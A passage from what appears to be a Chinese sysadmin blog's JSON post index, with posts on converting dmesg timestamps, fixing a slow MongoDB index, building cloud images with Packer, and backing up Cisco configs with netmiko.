是这样的：\n这个时间戳是天书啊，这还算好的，好歹有。还有更差的，连戳子都没有：\n戳子都没有的，需要做以下步骤来加上，机器重启后必须再执行一遍：\necho 1 \u0026gt; /sys/module/printk/parameters/printk_time 同时写个脚本，/usr/local/bin/dmesgt.sh\n#!/bin/bash # Translate dmesg timestamps to human readable format # desired date format date_format=\u0026#34;%a %b %d %T %Y\u0026#34; # uptime in seconds uptime=$(cut -d \u0026#34; \u0026#34; -f 1 /proc/uptime) # run only if timestamps are enabled if [ \u0026#34;Y\u0026#34; = \u0026#34;$(cat /sys/module/printk/parameters/time)\u0026#34; ]; then dmesg | sed \u0026#34;s/^\\[[ ]*\\?\\([0-9.]*\\)\\] \\(.*\\)/\\\\1 \\\\2/\u0026#34; | while read timestamp message; do printf \u0026#34;[%s] %s\\n\u0026#34; \u0026#34;$(date --date \u0026#34;now - $uptime seconds + $timestamp seconds\u0026#34; +\u0026#34;${date_format}\u0026#34;)\u0026#34; \u0026#34;$message\u0026#34; done else echo \u0026#34;Timestamps are disabled (/sys/module/printk/parameters/time)\u0026#34; fi 这样就可以了，最后我们测试一下：\necho \u0026#34;Enabled timestamps\u0026#34; | tee /dev/kmsg 看到带时间戳的信息就可以了：\n$ dmesg [...] Bluetooth: RFCOMM TTY layer initialized Bluetooth: RFCOMM socket layer initialized Bluetooth: RFCOMM ver 1.11 [...] [271309.434405] Enabled timestamps [...] ","permalink":"https://rendoumi.com/posts/20220725-dmesg_time/","summary":"\u003cp\u003e现在版本的 dmesg -T 都是带时间戳的。\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20220725172454313\" loading=\"lazy\" src=\"/posts/20220725-dmesg_time/image-20220725172454313.png\"\u003e\u003c/p\u003e\n\u003cp\u003e但是老的机器，很有可能是没有 -T 这个参数的，直接 dmesg 是这样的：\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20220725172554722\" loading=\"lazy\" src=\"/posts/20220725-dmesg_time/image-20220725172554722.png\"\u003e\u003c/p\u003e\n\u003cp\u003e这个时间戳是天书啊，这还算好的，好歹有。还有更差的，连戳子都没有：\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20220725172816958\" loading=\"lazy\" src=\"/posts/20220725-dmesg_time/image-20220725172816958.png\"\u003e\u003c/p\u003e\n\u003cp\u003e戳子都没有的，需要做以下步骤来加上，机器重启后必须再执行一遍：\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eecho\u003c/span\u003e \u003cspan class=\"m\"\u003e1\u003c/span\u003e \u0026gt; /sys/module/printk/parameters/printk_time\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e同时写个脚本，/usr/local/bin/dmesgt.sh\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cp\"\u003e#!/bin/bash\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cp\"\u003e\u003c/span\u003e\u003cspan class=\"c1\"\u003e# Translate dmesg timestamps to human readable format\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# desired date format\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003edate_format\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;%a %b %d %T %Y\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# uptime in seconds\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003euptime\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"k\"\u003e$(\u003c/span\u003ecut -d \u003cspan class=\"s2\"\u003e\u0026#34; \u0026#34;\u003c/span\u003e -f \u003cspan class=\"m\"\u003e1\u003c/span\u003e /proc/uptime\u003cspan class=\"k\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# run only if timestamps are enabled\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"o\"\u003e[\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;Y\u0026#34;\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;\u003c/span\u003e\u003cspan class=\"k\"\u003e$(\u003c/span\u003ecat /sys/module/printk/parameters/time\u003cspan class=\"k\"\u003e)\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;\u003c/span\u003e \u003cspan class=\"o\"\u003e]\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e \u003cspan class=\"k\"\u003ethen\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  dmesg \u003cspan class=\"p\"\u003e|\u003c/span\u003e sed \u003cspan class=\"s2\"\u003e\u0026#34;s/^\\[[ ]*\\?\\([0-9.]*\\)\\] \\(.*\\)/\\\\1 \\\\2/\u0026#34;\u003c/span\u003e \u003cspan class=\"p\"\u003e|\u003c/span\u003e \u003cspan class=\"k\"\u003ewhile\u003c/span\u003e \u003cspan class=\"nb\"\u003eread\u003c/span\u003e timestamp message\u003cspan class=\"p\"\u003e;\u003c/span\u003e \u003cspan class=\"k\"\u003edo\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nb\"\u003eprintf\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;[%s] %s\\n\u0026#34;\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;\u003c/span\u003e\u003cspan class=\"k\"\u003e$(\u003c/span\u003edate --date \u003cspan class=\"s2\"\u003e\u0026#34;now - \u003c/span\u003e\u003cspan class=\"nv\"\u003e$uptime\u003c/span\u003e\u003cspan class=\"s2\"\u003e seconds + \u003c/span\u003e\u003cspan class=\"nv\"\u003e$timestamp\u003c/span\u003e\u003cspan class=\"s2\"\u003e seconds\u0026#34;\u003c/span\u003e +\u003cspan class=\"s2\"\u003e\u0026#34;\u003c/span\u003e\u003cspan class=\"si\"\u003e${\u003c/span\u003e\u003cspan class=\"nv\"\u003edate_format\u003c/span\u003e\u003cspan class=\"si\"\u003e}\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;\u003c/span\u003e\u003cspan class=\"k\"\u003e)\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;\u003c/span\u003e\u003cspan class=\"nv\"\u003e$message\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"k\"\u003edone\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"k\"\u003eelse\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"nb\"\u003eecho\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;Timestamps are disabled (/sys/module/printk/parameters/time)\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"k\"\u003efi\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e这样就可以了，最后我们测试一下：\u003c/p\u003e","title":"dmesg -T 无时间戳的解决方法"},{"content":"接到同事的通知，说mongodb的cpu很高，下不去，看有什么办法。\n看了一下图，cpu都99.4%了，确实很高：\n登上机器，首先去看mongod的log，都试如下的查询，都很慢：\ncopy出一条来，备用\n2022-07-17T21:30:42.556+0800 I COMMAND [conn196670] command beyou.behaviorAnalysis command: find { find: \u0026#34;behaviorAnalysis\u0026#34;, filter: { behavior: { $regex: \u0026#34;.*互动操作.*\u0026#34;, $options: \u0026#34;i\u0026#34; }, log: { $regex: \u0026#34;.*\\Q观看：《罗马的房子》,\\E.*\u0026#34;, $options: \u0026#34;i\u0026#34; }, userId: 7345, _class: { $in: [ \u0026#34;com.linkyee.api.domain.po.BehaviorAnalysis\u0026#34; ] } }, $db: \u0026#34;beyou\u0026#34; } planSummary: IXSCAN { _class: 1, behavior: 1, log: 1, userId: 1 } keysExamined:111564 docsExamined:2 cursorExhausted:1 numYields:890 nreturned:2 reslen:571 locks:{ Global: { acquireCount: { r: 891 } }, Database: { acquireCount: { r: 891 } }, Collection: { acquireCount: { r: 891 } } } storage:{} protocol:op_msg 2268ms 发现确实很慢啊，op_msg 居然要2268ms，但是mongodb的数据目录总共才6G多，不客观啊。\n看看表结构和索引：\n\u0026gt; show dbs; admin 0.000GB beyou 0.063GB config 0.000GB local 0.000GB \u0026gt; use beyou; switched to db beyou \u0026gt; show collections; activityLog behaviorAnalysis \u0026gt; db.behaviorAnalysis.find({},{_id:0}).limit(1); { \u0026#34;name\u0026#34; : \u0026#34;812304163055734784\u0026#34;, \u0026#34;createTime\u0026#34; : ISODate(\u0026#34;2022-02-19T12:46:44.360Z\u0026#34;), \u0026#34;behavior\u0026#34; : \u0026#34;互动操作\u0026#34;, \u0026#34;log\u0026#34; : \u0026#34;加入看单：《爱的迫降》\u0026#34;, \u0026#34;userId\u0026#34; : 2, \u0026#34;_class\u0026#34; : \u0026#34;com.linkyee.api.domain.po.BehaviorAnalysis\u0026#34; } \u0026gt; db.behaviorAnalysis.getIndexes(); [ { \u0026#34;v\u0026#34; : 2, \u0026#34;key\u0026#34; : { \u0026#34;_id\u0026#34; : 1 }, \u0026#34;name\u0026#34; : \u0026#34;_id_\u0026#34;, \u0026#34;ns\u0026#34; : \u0026#34;beyou.behaviorAnalysis\u0026#34; }, { \u0026#34;v\u0026#34; : 2, \u0026#34;key\u0026#34; : { \u0026#34;_class\u0026#34; : 1, \u0026#34;behavior\u0026#34; : 1, \u0026#34;log\u0026#34; : 1, \u0026#34;userId\u0026#34; : 1 }, \u0026#34;name\u0026#34; : \u0026#34;_class_1_behavior_1_log_1_userId_1\u0026#34;, \u0026#34;ns\u0026#34; : \u0026#34;beyou.behaviorAnalysis\u0026#34; } ] 发现表结构不复杂，索引呢有两个，一个缺省的单字段索引_id，另一个是多字段索引，4合一的（ _class、behavior、log、userId ）\n继续，来看看查询：\nfind { find: \u0026#34;behaviorAnalysis\u0026#34;, filter: { behavior: { $regex: \u0026#34;.*互动操作.*\u0026#34;, $options: \u0026#34;i\u0026#34; }, log: { $regex: \u0026#34;.*\\Q观看：《罗马的房子》,\\E.*\u0026#34;, $options: \u0026#34;i\u0026#34; }, userId: 7345, _class: { $in: [ \u0026#34;com.linkyee.api.domain.po.BehaviorAnalysis\u0026#34; ] } }, $db: \u0026#34;beyou\u0026#34; } planSummary: IXSCAN { _class: 1, behavior: 1, log: 1, userId: 1 } keysExamined:111564 planSummary里，IXSCAN是查了索引，但是keyExamined居然有111564个，太多了吧。\n再看看索引，明显4合一的效率有问题。\n那就简单了，删掉这个4合一的索引，新建一个userId的索引，既然叫userId，那推测它是唯一的，重建索引需要后台执行，并且在业务不繁忙的时候再跑\ndb.behaviorAnalysis.createIndex({\u0026#34;userId\u0026#34;:1},{\u0026#34;name\u0026#34;:\u0026#39;idx_userId\u0026#39;,background:true,unique:true}); 同事执行的时候报错：\n居然key重复了，那就把 unique:true 去掉了再执行，就成功了。\n然后cpu就立竿见影，从100%降低到了2.8%\nover，如果再遇到瓶颈，估计就只能采用分片大法了。\n","permalink":"https://rendoumi.com/posts/20220721-mongodb_cpu/","summary":"\u003cp\u003e接到同事的通知，说mongodb的cpu很高，下不去，看有什么办法。\u003c/p\u003e\n\u003cp\u003e看了一下图，cpu都99.4%了，确实很高：\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20220721152856848\" loading=\"lazy\" src=\"/posts/20220721-mongodb_cpu/image-20220721152856848.png\"\u003e\u003c/p\u003e\n\u003cp\u003e登上机器，首先去看mongod的log，都试如下的查询，都很慢：\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20220721153814123\" loading=\"lazy\" src=\"/posts/20220721-mongodb_cpu/image-20220721153814123.png\"\u003e\u003c/p\u003e\n\u003cp\u003ecopy出一条来，备用\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode class=\"language-log\" data-lang=\"log\"\u003e2022-07-17T21:30:42.556+0800 I COMMAND  [conn196670] command beyou.behaviorAnalysis command: find { find: \u0026#34;behaviorAnalysis\u0026#34;, filter: { behavior: { $regex: \u0026#34;.*互动操作.*\u0026#34;, $options: \u0026#34;i\u0026#34; }, log: { $regex: \u0026#34;.*\\Q观看：《罗马的房子》,\\E.*\u0026#34;, $options: \u0026#34;i\u0026#34; }, userId: 7345, _class: { $in: [ \u0026#34;com.linkyee.api.domain.po.BehaviorAnalysis\u0026#34; ] } }, $db: \u0026#34;beyou\u0026#34; } planSummary: IXSCAN { _class: 1, behavior: 1, log: 1, userId: 1 } keysExamined:111564 docsExamined:2 cursorExhausted:1 numYields:890 nreturned:2 reslen:571 locks:{ Global: { acquireCount: { r: 891 } }, Database: { acquireCount: { r: 891 } }, Collection: { acquireCount: { r: 891 } } } storage:{} protocol:op_msg 2268ms\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e发现确实很慢啊，op_msg 居然要2268ms，但是mongodb的数据目录总共才6G多，不客观啊。\u003c/p\u003e","title":"一次mongodb cpu很high的解决方法"},{"content":"先普及一下概念，Infrastructure as Code，也就是从代码开始定义整个网络环境、虚机、各种资源等等。\n简单说就是在云上用代码来管理一切，无论是vpc、subnetwork、lb、snat、sg、ec2\u0026hellip;\u0026hellip;\n非常符合我的胃口，因为就连架构图，都是用 graphviz 来画的。\n那么 Infrastructure as Code （IAC） 可以分为以下五个部分：\nAd hoc scripts Configuration Management tools Orchestration tools Provisioning tools Server Templating tools 一、Ad hoc scripts 就是用软件对目的主机进行 point to point 操作，用shell或者ansible都可以。推荐ansible。\n在 infosys 面试被一个印度老外问到这问题，因为平时根本不用ansible 的 ad hoc 点对点模式，结果被当场问住。现在才知道这玩意是什么。当然，用 ansible 的话不建议用这个，因为 playbook 是可追溯的。\n二、Configuration Management tools 配置管理，这里当然推荐 ansible，每一步的操作都可以有 inventory 和 playbook 可以追溯。\n三、Orchestration tools 协同工具，k8s和kvm\n四、Provisioning tools 生产工具，当然是terraform，另外，阿里云是支持plumi的，华为腾讯不支持。\n五、Server Templating tools 模板工具，这里就是 Packer，其实我们公司现在的模板工具，是八戒从openstack学的，改动Cloud-init的东西。\nPacker更标准一下，是进化版的东西，它既可以打kvm镜像，也可以打Docker镜像。\n下面我们就看看怎么使用吧，这里先说kvm，因为kvm的比较难，docker的八戒现在还是用Dockerfile，有空了再研究packer：\n安装就不多说了，就一个执行文件，下载下来就行，不用装。\nPacker的核心是三个部分\nbuilders provisioners post-processors 我们先建立一个空目录，名字随便，就叫 test-image\nmkdir test-images cd test-image 然后在目录下面，建立三个文件：\npacker.json, variable.json, setup.sh\n首先看variable.json，对应AWS长这样\n{ \u0026#34;description\u0026#34;: \u0026#34;test image\u0026#34;, \u0026#34;access_key\u0026#34;: \u0026#34;enter-aws-your-key\u0026#34;, \u0026#34;secret_key\u0026#34;: \u0026#34;enter-aws-your-secret\u0026#34; \u0026#34;source_ami\u0026#34;: \u0026#34;enter-yours\u0026#34; } 对应腾讯云就是这样\n{ \u0026#34;description\u0026#34;: \u0026#34;test image\u0026#34;, \u0026#34;tc_secret_id\u0026#34;: \u0026#34;TENCENTCLOUD_ACCESS_KEY\u0026#34;, \u0026#34;tc_secret_key\u0026#34;: \u0026#34;TENCENTCLOUD_SECRET_KEY\u0026#34;, \u0026#34;source_tc\u0026#34;: \u0026#34;enter-yours\u0026#34; } 稍微解释一下，无论哪家云，你都需要去申请secret的key，才可以用，然后就是source_ami和source_tc了，这个指镜像的母版\naws的长这样：\n腾讯的长这样：\nok，变量都定义好了。\n下面是packer.json的正文\naws的这样：\n{ \u0026#34;builders\u0026#34;: [ { \u0026#34;type\u0026#34;: \u0026#34;amazon-ebs\u0026#34;, \u0026#34;access_key\u0026#34;: \u0026#34;{{user `access_key` }}\u0026#34;, \u0026#34;secret_key\u0026#34;: \u0026#34;{{user `secret_key` }}\u0026#34;, \u0026#34;region\u0026#34; : \u0026#34;us-east-1\u0026#34;, \u0026#34;ami_name\u0026#34; : \u0026#34;myfirstami\u0026#34;, \u0026#34;source_ami\u0026#34; : \u0026#34;{{user `source_ami` }}\u0026#34;, \u0026#34;instance_type\u0026#34; : \u0026#34;t2.micro\u0026#34;, \u0026#34;ssh_username\u0026#34; : \u0026#34;ec2-user\u0026#34; } ], \u0026#34;provisioners\u0026#34;: [ { \u0026#34;type\u0026#34;: \u0026#34;shell\u0026#34;, \u0026#34;script\u0026#34;: \u0026#34;setup.sh\u0026#34; } ], \u0026#34;post-processors\u0026#34;: [ { \u0026#34;type\u0026#34;: \u0026#34;manifest\u0026#34;, \u0026#34;output\u0026#34;: \u0026#34;out.json\u0026#34; } ] } 看见了吧，核心三部分。那么换成腾讯，就长这样\n{ \u0026#34;builders\u0026#34;: [ { \u0026#34;type\u0026#34;: \u0026#34;tencentcloud-cvm\u0026#34;, \u0026#34;secret_id\u0026#34;: \u0026#34;{{user `tc_secret_id`}}\u0026#34;, \u0026#34;secret_key\u0026#34;: \u0026#34;{{user `tc_secret_key`}}\u0026#34;, \u0026#34;region\u0026#34;: \u0026#34;ap-guangzhou\u0026#34;, \u0026#34;zone\u0026#34;: \u0026#34;ap-guangzhou-3\u0026#34;, \u0026#34;instance_type\u0026#34;: \u0026#34;S2.SMALL1\u0026#34;, \u0026#34;disk_type\u0026#34;: \u0026#34;CLOUD_PREMIUM\u0026#34;, \u0026#34;associate_public_ip_address\u0026#34;: true, \u0026#34;image_name\u0026#34;: \u0026#34;myfirsttc\u0026#34;, \u0026#34;source_image_id\u0026#34;: \u0026#34;{{user `source_tc` }}\u0026#34;, \u0026#34;ssh_username\u0026#34; : \u0026#34;root\u0026#34; } ], \u0026#34;provisioners\u0026#34;: [ { \u0026#34;type\u0026#34;: \u0026#34;shell\u0026#34;, \u0026#34;script\u0026#34;: \u0026#34;setup.sh\u0026#34; } ], \u0026#34;post-processors\u0026#34;: [ { \u0026#34;type\u0026#34;: \u0026#34;manifest\u0026#34;, \u0026#34;output\u0026#34;: \u0026#34;out.json\u0026#34; } ] } 大差不差吧。\n详细参数可以去看：https://www.packer.io/plugins/builders/tencentcloud\n那最后就是setup.sh了，举例装个jenkins好了，其他的可以根据需要进行注入：\nsleep 30 sudo yum update –y sudo wget -O /etc/yum.repos.d/jenkins.repo \\ https://pkg.jenkins.io/redhat-stable/jenkins.repo sudo rpm --import https://pkg.jenkins.io/redhat-stable/jenkins.io.key sudo yum upgrade sudo yum instqll -y epel-release sudo yum install java-openjdk11 -y sudo yum install jenkins -y sudo systemctl enable jenkins sudo systemctl start jenkins sudo systemctl status jenkins 最后run一下：\npacker build -var-file=\u0026#34;variable.json\u0026#34; packer.json 叽哩咕噜一顿，就build好了\nOver，这个工具在IAS中是不可缺少的一环。\n","permalink":"https://rendoumi.com/posts/20220717-terraform/","summary":"\u003cp\u003e先普及一下概念，Infrastructure as Code，也就是从代码开始定义整个网络环境、虚机、各种资源等等。\u003c/p\u003e\n\u003cp\u003e简单说就是在云上用代码来管理一切，无论是vpc、subnetwork、lb、snat、sg、ec2\u0026hellip;\u0026hellip;\u003c/p\u003e\n\u003cp\u003e非常符合我的胃口，因为就连架构图，都是用 graphviz 来画的。\u003c/p\u003e\n\u003cp\u003e那么 Infrastructure as Code （IAC） 可以分为以下五个部分：\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eAd hoc scripts\u003c/strong\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eConfiguration Management tools\u003c/strong\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eOrchestration tools\u003c/strong\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eProvisioning tools\u003c/strong\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eServer Templating tools\u003c/strong\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch4 id=\"一ad-hoc-scripts\"\u003e一、Ad hoc scripts\u003c/h4\u003e\n\u003cp\u003e就是用软件对目的主机进行 point to point 操作，用shell或者ansible都可以。推荐ansible。\u003c/p\u003e\n\u003cp\u003e在 infosys 面试被一个印度老外问到这问题，因为平时根本不用ansible 的 ad hoc 点对点模式，结果被当场问住。现在才知道这玩意是什么。当然，用 ansible 的话不建议用这个，因为 playbook 是可追溯的。\u003c/p\u003e\n\u003ch4 id=\"二configuration-management-tools\"\u003e二、Configuration Management tools\u003c/h4\u003e\n\u003cp\u003e配置管理，这里当然推荐 ansible，每一步的操作都可以有 inventory 和 playbook 可以追溯。\u003c/p\u003e\n\u003ch4 id=\"三orchestration-tools\"\u003e三、Orchestration tools\u003c/h4\u003e\n\u003cp\u003e协同工具，k8s和kvm\u003c/p\u003e\n\u003ch4 id=\"四provisioning-tools\"\u003e四、Provisioning tools\u003c/h4\u003e\n\u003cp\u003e生产工具，当然是terraform，另外，阿里云是支持plumi的，华为腾讯不支持。\u003c/p\u003e\n\u003ch4 id=\"五server-templating-tools\"\u003e五、Server Templating tools\u003c/h4\u003e\n\u003cp\u003e模板工具，这里就是 Packer，其实我们公司现在的模板工具，是八戒从openstack学的，改动Cloud-init的东西。\u003c/p\u003e\n\u003cp\u003ePacker更标准一下，是进化版的东西，它既可以打kvm镜像，也可以打Docker镜像。\u003c/p\u003e\n\u003cp\u003e下面我们就看看怎么使用吧，这里先说kvm，因为kvm的比较难，docker的八戒现在还是用Dockerfile，有空了再研究packer：\u003c/p\u003e\n\u003cp\u003e安装就不多说了，就一个执行文件，下载下来就行，不用装。\u003c/p\u003e\n\u003cp\u003ePacker的核心是三个部分\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003ebuilders\u003c/li\u003e\n\u003cli\u003eprovisioners\u003c/li\u003e\n\u003cli\u003epost-processors\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e我们先建立一个空目录，名字随便，就叫 test-image\u003c/p\u003e","title":"Infrastructure as Code中packer的使用"},{"content":"在日常工作中我们经常要对 Cisco 的网络设备的配置进行备份，或者和 suricata 联动的时候要执行操作。\n方法其实很简单，调用 python 的相应模块即可。\n准备工作如下：\n首选需要在/export/servers/python363装好 python 3.6, pip install netmiko\n其次，在路由器上可以配置en的密码\n然后依次执行备份就可以了。\n#!/export/servers/python363/bin/python3.6 from netmiko import Netmiko import time tw_bgp = { \u0026#34;device_type\u0026#34;: \u0026#34;cisco_ios\u0026#34;, \u0026#34;host\u0026#34;: \u0026#34;tw-bgp\u0026#34;, \u0026#34;ip\u0026#34;: \u0026#34;192.168.1.10\u0026#34;, \u0026#34;username\u0026#34;: \u0026#34;noc\u0026#34;, \u0026#34;use_keys\u0026#34;: True, \u0026#34;secret\u0026#34; : \u0026#34;xxxxxxxx\u0026#34;, \u0026#34;key_file\u0026#34;: \u0026#34;/root/.ssh/id_jump_rsa_new\u0026#34;, } tw_r1_e1 = { \u0026#34;device_type\u0026#34;: \u0026#34;cisco_ios\u0026#34;, \u0026#34;host\u0026#34;: \u0026#34;tw-r1-e1\u0026#34;, \u0026#34;ip\u0026#34;: \u0026#34;192.168.1.11\u0026#34;, \u0026#34;username\u0026#34;: \u0026#34;noc\u0026#34;, \u0026#34;use_keys\u0026#34;: True, \u0026#34;key_file\u0026#34;: \u0026#34;/root/.ssh/id_jump_rsa_new\u0026#34;, } tw_r1_e2 = { \u0026#34;device_type\u0026#34;: \u0026#34;cisco_ios\u0026#34;, \u0026#34;host\u0026#34;: \u0026#34;tw-r1-e2\u0026#34;, \u0026#34;ip\u0026#34;: \u0026#34;192.168.1.12\u0026#34;, \u0026#34;username\u0026#34;: \u0026#34;noc\u0026#34;, \u0026#34;use_keys\u0026#34;: True, \u0026#34;key_file\u0026#34;: \u0026#34;/root/.ssh/id_jump_rsa_new\u0026#34;, } tw_r2_e1 = { \u0026#34;device_type\u0026#34;: \u0026#34;cisco_ios\u0026#34;, \u0026#34;host\u0026#34;: \u0026#34;tw-r2-e1\u0026#34;, \u0026#34;ip\u0026#34;: \u0026#34;192.168.1.13\u0026#34;, \u0026#34;username\u0026#34;: \u0026#34;noc\u0026#34;, \u0026#34;use_keys\u0026#34;: True, \u0026#34;key_file\u0026#34;: \u0026#34;/root/.ssh/id_jump_rsa_new\u0026#34;, } tw_r2_e2 = { \u0026#34;device_type\u0026#34;: \u0026#34;cisco_ios\u0026#34;, \u0026#34;host\u0026#34;: \u0026#34;tw-r2-e2\u0026#34;, \u0026#34;ip\u0026#34;: \u0026#34;192.168.1.14\u0026#34;, \u0026#34;username\u0026#34;: \u0026#34;noc\u0026#34;, \u0026#34;use_keys\u0026#34;: True, \u0026#34;key_file\u0026#34;: \u0026#34;/root/.ssh/id_jump_rsa_new\u0026#34;, } devices=[tw_bgp, tw_r1_e1, tw_r1_e2, tw_r2_e1, tw_r2_e2] for dev in devices: name = dev[\u0026#34;ip\u0026#34;] connection = Netmiko(**dev) connection.enable() out = connection.send_command(\u0026#34;show running-config\u0026#34;) calender = time.strftime(\u0026#34;%Y%m%d\u0026#34;) file_name = \u0026#39;{}-{}.txt\u0026#39;.format(dev[\u0026#34;host\u0026#34;],calender) file = open(file_name ,\u0026#34;w\u0026#34;) file.write(out) file.close() connection.disconnect() print(\u0026#34;BACKUP for %s done\u0026#34; %dev[\u0026#34;host\u0026#34;]) ","permalink":"https://rendoumi.com/posts/20220717-backup_cisco/","summary":"\u003cp\u003e在日常工作中我们经常要对 Cisco 的网络设备的配置进行备份，或者和 suricata 联动的时候要执行操作。\u003c/p\u003e\n\u003cp\u003e方法其实很简单，调用 python 的相应模块即可。\u003c/p\u003e\n\u003cp\u003e准备工作如下：\u003c/p\u003e\n\u003cp\u003e首选需要在/export/servers/python363装好 python 3.6,  pip install netmiko\u003c/p\u003e\n\u003cp\u003e其次，在路由器上可以配置en的密码\u003c/p\u003e\n\u003cp\u003e然后依次执行备份就可以了。\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-python\" data-lang=\"python\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"ch\"\u003e#!/export/servers/python363/bin/python3.6\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"kn\"\u003efrom\u003c/span\u003e \u003cspan class=\"nn\"\u003enetmiko\u003c/span\u003e \u003cspan class=\"kn\"\u003eimport\u003c/span\u003e \u003cspan class=\"n\"\u003eNetmiko\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"kn\"\u003eimport\u003c/span\u003e \u003cspan class=\"nn\"\u003etime\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"n\"\u003etw_bgp\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"s2\"\u003e\u0026#34;device_type\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;cisco_ios\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan 